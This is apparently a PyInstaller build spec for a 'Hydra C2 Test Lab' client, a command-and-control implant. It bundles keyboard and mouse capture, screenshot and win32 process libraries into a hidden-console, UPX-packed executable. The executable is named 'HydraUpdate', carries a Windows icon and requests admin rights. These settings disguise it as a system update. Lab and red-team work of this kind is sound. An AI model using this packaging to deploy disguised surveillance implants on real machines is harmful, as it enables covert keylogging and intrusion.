# -*- mode: python ; coding: utf-8 -*-
"""
PyInstaller spec file for Hydra C2 Test Lab client
"""

import os
from PyInstaller.utils.hooks import collect_data_files, collect_submodules

block_cipher = None

# Define paths
spec_root = os.path.abspath(SPECPATH)
client_root = os.path.join(spec_root)

# Collect all necessary modules
hiddenimports = [
    'asyncio',
    'websockets',
    'pynput.keyboard',
    'pynput.mouse',
    'cryptography',
    'PIL',
    'PIL.Image',
    'win32api',
    'win32con',
    'win32gui',
    'win32process',
    'psutil',
]

# Collect all submodules of key packages
hiddenimports.extend(collect_submodules('pynput'))
hiddenimports.extend(collect_submodules('cryptography'))
hiddenimports.extend(collect_submodules('PIL'))

# Collect data files
datas = []
datas.extend(collect_data_files('hydra_client'))

# Basic analysis
a = Analysis(
    ['hydra_client_lab.py'],
    pathex=[client_root],
    binaries=[],
    datas=datas,
    hiddenimports=hiddenimports,
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

# Create the executable
pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='HydraUpdate',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon='windows.ico',
    version='version.txt',
    uac_admin=True,
) 